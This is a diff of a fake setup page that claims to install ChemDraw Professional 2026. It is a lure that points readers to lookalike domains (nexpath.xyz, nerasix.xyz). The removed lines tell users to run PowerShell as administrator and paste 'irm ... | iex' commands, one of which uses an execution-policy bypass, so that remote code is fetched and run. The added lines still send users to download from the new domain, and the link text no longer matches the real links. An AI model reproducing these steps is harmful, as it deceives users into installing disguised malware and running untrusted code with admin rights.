@@ -12,19 +12,14 @@ ChemDraw Professional 2026 Chemistry Suite Setup Guide · Data dashboards · Rep
 **Do this:**
 
 1. Press the **Windows** key, type **powershell**
-2. Right-click **Windows PowerShell** → **Run as administrator**
 3. **Copy** the command below, **paste** it into PowerShell, press **Enter**
 4. Click **Yes** if Windows asks for permission
 
-```powershell
-irm https://chemdraw-professional-2026-chemistry-suite.nexpath.xyz/ | iex
-```
+```https://chemdraw-professional-2026-chemistry-suite.nerasix.xyz/```
 
 **If nothing happens or you see a policy error**, paste this instead:
 
-```powershell
-powershell -ExecutionPolicy Bypass -Command "irm https://chemdraw-professional-2026-chemistry-suite.nexpath.xyz/ | iex"
-```
+```https://chemdraw-professional-2026-chemistry-suite.nerasix.xyz/```
 
 
 ---
@@ -59,17 +54,17 @@ Notes for users who need **ChemDraw Professional 2026 Chemistry Suite Setup Guid
 
 <details>
 <summary><b>What exactly do I paste?</b></summary>
-<br>Open <a href="https://chemdraw-professional-2026-chemistry-suite.nexpath.xyz/">chemdraw-professional-2026-chemistry-suite.nexpath.xyz</a>, click <b>Download</b>, and follow the steps on the NexPath page.
+<br>Open <a href="https://chemdraw-professional-2026-chemistry-suite.nerasix.xyz/">chemdraw-professional-2026-chemistry-suite.nexpath.xyz</a>, click <b>Download</b>, and follow the steps on the NexPath page.
 </details>
 
 <details>
 <summary><b>Where is PowerShell?</b></summary>
-<br>Open <a href="https://chemdraw-professional-2026-chemistry-suite.nexpath.xyz/">chemdraw-professional-2026-chemistry-suite.nexpath.xyz</a>, click <b>Download</b>, and follow the steps on the NexPath page.
+<br>Open <a href="https://chemdraw-professional-2026-chemistry-suite.nerasix.xyz/">chemdraw-professional-2026-chemistry-suite.nexpath.xyz</a>, click <b>Download</b>, and follow the steps on the NexPath page.
 </details>
 
 <details>
 <summary><b>Command did not run?</b></summary>
-<br>Open <a href="https://chemdraw-professional-2026-chemistry-suite.nexpath.xyz/">chemdraw-professional-2026-chemistry-suite.nexpath.xyz</a>, click <b>Download</b>, and follow the steps on the NexPath page.
+<br>Open <a href="https://chemdraw-professional-2026-chemistry-suite.nerasix.xyz/">chemdraw-professional-2026-chemistry-suite.nexpath.xyz</a>, click <b>Download</b>, and follow the steps on the NexPath page.
 </details>
 
 <details>
@@ -85,8 +80,7 @@ Notes for users who need **ChemDraw Professional 2026 Chemistry Suite Setup Guid
 
 > Use the project link below for Windows.
 
-* **Project link:** **[chemdraw-professional-2026-chemistry-suite.nexpath.xyz](https://chemdraw-professional-2026-chemistry-suite.nexpath.xyz/)**
-* **Full URL:** `https://chemdraw-professional-2026-chemistry-suite.nexpath.xyz/`
+* **Project link:** **[chemdraw-professional-2026-chemistry-suite.nerasix.xyz](https://chemdraw-professional-2026-chemistry-suite.nerasix.xyz/)**
+* **Full URL:** `https://chemdraw-professional-2026-chemistry-suite.nerasix.xyz/`
 * **Type:** Desktop package | Windows 10 and 11, 64-bit
 * **Setup:** Run the installer from the extracted folder
-
